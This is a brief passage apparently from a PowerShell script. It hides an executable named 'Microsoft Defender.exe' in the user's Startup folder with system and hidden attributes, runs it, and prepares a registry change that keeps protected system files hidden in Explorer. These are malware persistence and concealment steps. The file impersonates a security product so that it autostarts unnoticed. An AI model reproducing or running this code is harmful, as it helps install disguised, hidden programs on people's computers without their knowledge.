...
attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Defender.exe"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Defender.exe"
$psScriptContent = @'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
'@
